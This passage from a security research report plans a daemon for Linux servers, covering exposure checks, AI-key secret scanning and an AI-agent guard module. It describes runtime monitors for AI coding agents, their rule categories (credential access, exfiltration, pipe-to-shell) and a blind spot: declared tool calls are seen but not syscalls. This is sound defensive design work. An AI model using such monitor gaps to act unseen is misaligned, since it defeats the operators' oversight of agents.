On the AI-era threats, only three relevant newcomers exist and none is a resident host tool for small fleets. Tencent's AI-Infra-Guard fingerprints AI components (Ollama, vLLM, ComfyUI, n8n and others, claiming 2,000+ CVE rules across 146 components) and scans MCP servers and agent skills, but it is a network scanner you run on demand, not an agent ([Help Net Security](https://www.helpnetsecurity.com/2026/09/09/ai-infra-guard-open-source-security-scanner-ai-systems/)). Falco's experimental Prempti (May 2026) applies policy to AI coding-agent tool calls, with rules for credential access, destructive commands, pipe-to-shell, exfiltration and MCP tampering, but by its own description it sees the calls the agent declares, not the resulting syscalls, and is "not a sandbox" ([Falco blog](https://falco.org/blog/introducing-prempti/)). Sysdig's commercial product detects agent activity at runtime and notes the practical wrinkle that Claude Code runs as a bundled Bun binary, so per-agent process identification needs explicit handling ([Sysdig](https://sysdig.com/blog/runtime-security-for-ai-coding-agents-protecting-ai-assisted-development)). Sandboxes for agents (Anthropic's `sandbox-runtime` on bubblewrap, Codex's Landlock+seccomp, nono) are per-developer opt-ins; nothing at fleet level inventories which agents run where, whether they are sandboxed, and what they executed ([aiweekly](https://aiweekly.co/alerts/anthropic-open-sources-claude-code-sandbox-under-apache-20); [rywalker](https://rywalker.com/research/local-agent-sandboxes)). Across all searches, no source documented a tool that continuously scans a running server's environment variables, `/proc/*/environ`, `.env` files, shell history and agent config directories for AI provider keys.

## What the new tool should do: a prioritized module plan

The design brief that falls out of the research is specific. Build a single Go or Rust binary that runs as a daemon with scheduled checks, keeps its state in SQLite, uses well under 100 MB of RAM, has no mandatory external service, ships opinionated rules, and pushes deduplicated, severity-ranked alerts with a remediation hint attached to each. Orchestrate the classic tools where they are already good (drive fail2ban or CrowdSec for banning, AIDE for bulk integrity, Trivy or Grype for package CVEs, gitleaks as a scanning engine) instead of reimplementing them, and build the uncovered AI-era modules yourself. Design for capability detection and graceful degradation, because eBPF needs BTF, Landlock ABI versions vary and unprivileged user namespaces are sometimes disabled; every module should have a `/proc`-polling or auditd fallback. Pin and verify everything the tool installs, because needrestart, Trivy and TruffleHog all show that security tooling is a target.

### Suggested build order

**Phase 1 (weeks 1–8): close the front door and the AI key gap with no kernel dependencies.** Build M1 (exposure scanner with the AI service profile and the Docker-vs-firewall check), M2 (SSH and auth guard that configures and reads fail2ban or CrowdSec), M3 (patch and KEV watcher with the three-day timer), M8 (secrets-on-host scanner with AI key formats and rotation tracking), M5 in its basic form (the curated persistence watchlist plus `ld.so.preload` and PAM checksum verification) and M12 (alerting). All of these work from `/proc`, `ss`, package-manager metadata, log files and the filesystem, so they run on any kernel and in any container. Together they address the top initial-access vectors (exploits, exposed services, SSH), the fastest-growing AI-era problem (leaked keys), and the single most common persistence paths, and they are the modules with the clearest "nobody does this today" gap.

**Phase 2 (weeks 9–20): see what processes actually do.** Add M7 (process behavior) and M6 (rootkit cross-check) using auditd with Laurel-style enrichment as the baseline and Falco or a native eBPF sensor where BTF is available; add M4 (kernel attack-surface reducer, including the AF_ALG + splice rule and the setuid page-cache comparison), M9 (AI agent guard, which depends on the process inventory from M7) and M11 (egress monitor). This phase catches the post-exploitation activity that Phase 1 only infers, and it is where the tool starts to detect the things rkhunter, chkrootkit and hash-based FIM structurally cannot.

**Phase 3 (weeks 21+): supply chain, fleet and AI-assisted triage.** Add M10 (package provenance and slopsquatting checks hooked into npm, pip and gem), container image layer scanning as an extension of M8, an optional lightweight central view across hosts (keeping SQLite per host and syncing summaries, not raw events, to avoid becoming Wazuh), and an AI-assisted triage layer that summarizes and ranks findings with human review, since AI-generated patches still show 37.7 to 45.6% semantic failure rates in CSA's analysis and should not auto-apply ([CSA Labs](https://labs.cloudsecurityalliance.org/research/ai-accelerated-exploitation-systemic-risk-v1/)). Phase 3 is also the right time to run AI code scanners against the tool's own codebase and configuration, which the AIxCC and Mythos results suggest is now cheap enough to be routine.

## Conclusion

The deepest shift in the research is not any single bug but a change in what a server is worth to an attacker. A Linux box used to be worth its CPU; now it is worth the keys it holds, and AI keys are the most liquid of those because they convert directly into resold model access at tens of thousands of dollars a day. That reframes the tool's job: a server security manager in 2026 is as much a credential-hygiene and exposure tool as an intrusion detector, and the modules with the biggest unfilled gap (host-level secret scanning, AI-service exposure checks, agent-config tampering) are also the easiest to build, because they need no kernel hooks.

The second shift is that the patch window has stopped being a window. With exploitation starting before disclosure on average and public proofs of concept arriving within a day of a kernel bug's announcement, the only durable defenses are the ones that do not depend on timing: shrinking the reachable kernel surface, watching for the behaviors an exploit must perform, and making the three-day fix cycle automatic rather than heroic. A tool that encodes those three ideas as defaults, stays light enough to run everywhere, and drives the existing open-source tools instead of competing with them would fill a space that fail2ban, Falco, AIDE and Wazuh each cover only a corner of.
